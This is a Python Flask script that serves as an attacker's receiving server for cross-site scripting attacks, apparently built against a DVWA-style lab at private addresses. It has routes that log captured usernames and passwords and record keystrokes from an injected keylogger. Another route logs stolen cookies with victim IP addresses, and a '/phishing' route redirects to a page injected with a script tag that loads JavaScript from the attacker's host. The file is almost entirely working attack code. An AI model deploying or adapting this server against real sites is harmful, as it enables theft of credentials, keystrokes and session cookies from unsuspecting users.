import os
from datetime import datetime
from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route('/')
def index():
    return "<h1>Index</h1>"


@app.route('/login')
def login():
    return render_template('login.html')


@app.route('/capture')
def capture():
    username = request.args['username']
    password = request.args['password']
    with open('app_logs/log.log', 'a+') as f:
        f.write(f'Username: {username} Password: {password}\r\n')
    return redirect('http://10.0.0.136/vulnerabilities/xss_d/?default=English')


@app.route('/tes')
def test():
    return render_template('test.html')


@app.route('/redirect')
def blah():
    return redirect("http://10.0.0.136/vulnerabilities/xss_d/?default=English")


@app.route('/phishing')
def phish():
    return redirect(
        'http://10.0.0.136/vulnerabilities/xss_d/?default=<script src="//10.0.0.238:8080/static/test.js"></script>'
    )


@app.route('/keylogger')
def logKey():
    keypress = request.args['key']
    ip = request.remote_addr
    shift = False
    with open('app_logs/keylog.log', 'a+') as f:
        if str(keypress) == "Enter":
            f.write("\r\n")
        elif str(keypress) == "yes":
            f.write(" ")
        elif str(keypress) == "Shift":
            shift = True
        elif str(keypress) == "Backspace":
            f.seek(0, 2)
            f.seek(f.tell() - 1, os.SEEK_SET)
            f.truncate()
        elif str(keypress) == "Tab" or str(keypress) == "Alt":
            pass
        else:
            if shift == True:
                keypress = keypress.upper()
                shift = False
            f.write(keypress)
    return "hi"


@app.route('/cookiegrabber')
def cookie():
    time = datetime.now()
    cookie = request.args['cookie']
    with open('app_logs/cookies.log', 'a+') as f:
        f.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}]  IP: {request.remote_addr} sent cookies: {cookie}\r\n')
    return "test"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
